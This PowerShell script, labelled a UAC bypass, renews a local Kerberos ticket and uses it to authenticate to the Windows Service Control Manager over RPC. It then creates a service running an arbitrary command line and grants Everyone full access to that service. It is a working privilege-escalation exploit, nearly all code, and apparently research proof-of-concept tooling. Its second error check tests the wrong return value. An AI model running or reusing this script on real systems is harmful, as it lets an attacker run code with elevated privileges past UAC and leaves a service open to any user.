# UAC bypass. Creates an arbitrary service with a specified name and command line.
param(
    [Parameter(Mandatory)]
    [string]$ServiceName,
    [Parameter(Mandatory)]
    [string]$CommandLine,
    [switch]$Format
)

. "$PSScriptRoot\common.ps1"
try {
    $spn = "HOST/$env:COMPUTERNAME"
    $ticket = Get-KerberosTicket $spn
    $tgs = New-KerberosTgsRequest -Credential $ticket -Renew
    $renew_ticket = Send-KerberosKdcRequest $tgs
    $cache = New-KerberosTicketCache -AdditionalTicket $renew_ticket

    $rpc = Get-RpcServer -SerializedPath "$PSScriptRoot\scm_rpc.bin"
    Use-NtObject($client = Get-RpcClient $rpc) {
        Connect-RpcClient $client -EndpointPath "\pipe\ntsvcs" -ProtocolSequence "ncacn_np" -ServicePrincipalName $spn `
            -AuthenticationType Kerberos -AuthenticationLevel PacketPrivacy -Cache $cache
            
        $scm = $client.ROpenSCManagerW([NullString]::Value, [NullString]::Value, 3)
        if ($scm.retval -ne 0) {
            throw [System.ComponentModel.Win32Exception]::new($scm.retval)
        }
        # p3 is scm handle.
        $service = $client.RCreateServiceW($scm.p3, $ServiceName, [NullString]::Value, 33554432, 16, `
            3, 0, $CommandLine, [NullString]::Value, $null, $null, 0, [NullString]::Value, $null, 0)
        if ($scm.retval -ne 0) {
            throw [System.ComponentModel.Win32Exception]::new($scm.retval)
        }
        $sd = New-NtSecurityDescriptor "D:(A;;GA;;;WD)"
        $ba = $sd.ToByteArray()
        $r = $client.RSetServiceObjectSecurity($service.p15, 4, $ba, $ba.Length)
        if ($r -ne 0) {
            throw [System.ComponentModel.Win32Exception]::new($r)
        }
    }
} catch {
    Write-Error $_
}